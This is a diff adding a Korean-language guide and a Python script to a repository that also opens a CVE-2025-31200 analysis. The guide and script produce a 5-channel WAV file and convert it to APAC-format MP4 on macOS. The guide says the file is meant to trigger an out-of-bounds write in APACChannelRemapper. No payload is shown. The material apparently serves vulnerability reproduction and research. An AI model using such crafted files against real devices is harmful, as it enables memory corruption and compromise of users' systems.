@@ -1,4 +1,88 @@
 
+# 실험용 WAV 및 APAC MP4 파일 생성 가이드
+
+이 가이드는 APAC 취약점 재현을 위한 다채널 WAV 파일을 생성하고, 이를 APAC 포맷 MP4로 변환하는 방법을 설명합니다.
+
+---
+
+## 📦 1. Python 스크립트로 .wav 파일 생성
+
+### ✅ 필요한 라이브러리 설치
+```bash
+pip install soundfile numpy
+```
+
+### ▶️ 실행
+```bash
+python generate_apac_test_audio.py
+```
+
+### 📄 출력
+- `sound440hz_5ch.wav`: 5채널짜리 440Hz sine tone 오디오 파일
+
+---
+
+## 🎵 2. APAC MP4로 변환 (macOS)
+
+macOS의 `afconvert` 명령어를 사용해야 APAC 포맷으로 인코딩 가능합니다.
+
+```bash
+afconvert -o output_apac.mp4 -d apac -f mp4f sound440hz_5ch.wav
+```
+
+> ⚠️ `afconvert`는 macOS 전용이며, APAC 코덱 인코딩을 지원하는 유일한 사용자 도구입니다.
+
+---
+
+## 🔍 확인 방법
+
+```bash
+ffmpeg -i output_apac.mp4
+```
+
+출력 로그에서 다음과 같은 스트림이 보이면 성공입니다:
+
+```
+Stream #0:0: Audio: none (apac / 0x63617061), 48000 Hz, 4.0, ...
+```
+
+---
+
+## 🧪 테스트 목적
+
+이 파일은 `mRemappingArray`와 실제 오디오 채널 수의 불일치를 유도하여, APACChannelRemapper 내부의 OOB Write 취약점을 실험적으로 유도할 수 있습니다.
+
+
+
+
+# generate_apac_test_audio.py
+# This script creates a 5-channel dummy WAV file for use in APAC-related PoC testing.
+
+import numpy as np
+import soundfile as sf
+
+# Configuration
+channels = 5
+samplerate = 48000
+duration = 2.0  # 2 seconds
+filename = "sound440hz_5ch.wav"
+
+# Generate sine wave (440Hz tone)
+t = np.linspace(0, duration, int(samplerate * duration), endpoint=False)
+tone = 0.5 * np.sin(2 * np.pi * 440 * t)
+
+# Duplicate tone across channels
+data = np.column_stack([tone for _ in range(channels)])
+
+# Save WAV file
+sf.write(filename, data, samplerate, subtype='PCM_16')
+print(f"[+] Created multi-channel WAV file: {filename}")
+
+
+
+
+
+
 # CVE-2025-31200 Deep Technical Analysis
 
 ---
